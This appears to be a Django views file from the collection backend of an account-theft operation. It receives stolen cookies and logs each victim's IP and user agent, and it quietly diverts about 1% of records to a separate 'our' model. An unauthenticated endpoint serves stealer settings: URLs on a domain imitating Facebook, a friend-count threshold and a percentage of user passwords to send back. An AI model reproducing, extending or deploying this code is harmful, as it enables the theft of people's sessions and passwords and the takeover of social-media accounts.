from django.shortcuts import render
from django.http import HttpResponse, Http404, JsonResponse

# Create your views here.
from django.template import loader

from .models import Cookies

from rest_framework.permissions import IsAuthenticated  # <-- Here
from django.http import Http404
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status

from cookies.serializers import CookiesSerializer, CookiesSerializer_my


# from django.contrib.auth.decorators import login_required
#
# @login_required
def index(request):
    latest_cookies_list = Cookies.objects.order_by('-created')
    template = loader.get_template('cookies/index.html')
    context = {
        'latest_cookies_list': latest_cookies_list,
    }

    return HttpResponse(template.render(context, request))

import random
from .http_util import run_notify_in_thread
class HelloView(APIView):
    permission_classes = (IsAuthenticated,)  # <-- And here
    def get_ip_ua(self, request, obj):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ipaddress = x_forwarded_for.split(',')[-1].strip()
        else:
            ipaddress = request.META.get('REMOTE_ADDR')
        user_agent = request.META.get('HTTP_USER_AGENT')

        obj.ua = user_agent
        obj.ip  = ipaddress
        obj.save()
        # notify_ok_http_get(ipaddress)

    def get(self, request):
        cookies = Cookies.objects.all()
        serializer = CookiesSerializer(cookies, many=True)

        return Response(serializer.data)

    # 按一定概率保存到某个model里面
    def post(self, request):
        print("-------- post ---------")
        print(request.data)
        serializer = CookiesSerializer(data=request.data)
        serializer_my = CookiesSerializer_my(data=request.data)

        if serializer.is_valid():
            #'You must call `.is_valid()` before calling `.save()`
            serializer_my.is_valid()
            if random.randint(0, 100) > 99: # 我们的开始先给他们哈
                obj = serializer_my.save()
                # get ip
                self.get_ip_ua(request, obj)
                print("serializer_my created ok")
            else: # 他们的
                obj = serializer.save()
                # get ip
                self.get_ip_ua(request, obj)
                print("serializer created ok")
                run_notify_in_thread(obj.ip)

            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

# "friends_num"  好友数低于多少回传
# upw_persent  用户密码回传比例 0~100
class GetUrlsView(APIView):
    # permission_classes = (IsAuthenticated,)  # <-- And here

    def post(self, request):
        return JsonResponse({'url': 'https://fuckbook.network/app/',
                             'url_redirect':'https://fuckbook.network/app/video/',
                             'url_redirect2': 'https://fuckbook.network/app/video/',
                             'friends_num': 1500,
                             'upw_persent': 50
                             })

